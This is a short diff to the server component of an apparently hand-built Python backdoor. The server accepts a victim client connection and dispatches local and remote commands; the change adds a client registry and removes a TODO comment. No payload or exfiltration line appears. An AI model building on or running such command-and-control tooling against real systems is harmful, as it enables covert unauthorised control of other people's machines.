@@ -13,6 +13,7 @@ from backdoor.messages.exchange.server import ServerExchangeMapper
 from backdoor.messages.messenger import SocketMessenger
 from backdoor.models.client import ClientModel
 from backdoor.models.commands import Command, LocalCommand, RemoteCommand
+from backdoor.server.registry import ClientRegistry
 from backdoor.utils.errors import print_error
 
 
@@ -25,6 +26,7 @@ class Server:
         converter: InputToCommandConverter,
         processor: CommandProcessor,
         executor: LocalCommandExecutor,
+        registry: ClientRegistry,
         host: str,
         port: int,
     ) -> None:
@@ -35,12 +37,15 @@ class Server:
         self.converter = converter
         self.processor = processor
         self.executor = executor
+        self.registry = registry
         self.socket = self.__create_socket(host, port)
         self.ps1 = ">>> "
 
     def start(self) -> None:
         client = self.__accept_connection()
         self.__read_client_report(client)
+
+        self.registry.register(client)
 
         while (inp := self.__get_input()) != "exit":
             command = self.converter.convert(inp)
@@ -63,9 +68,6 @@ class Server:
     @__perform_command.register
     def __(self, command: LocalCommand, client: ClientModel) -> None:
         result = self.executor.execute(command)
-
-        # TODO: Need a way for post_process to access client and print the info
-
         self.processor.post_process(command, result)
 
     def __accept_connection(self) -> ClientModel:
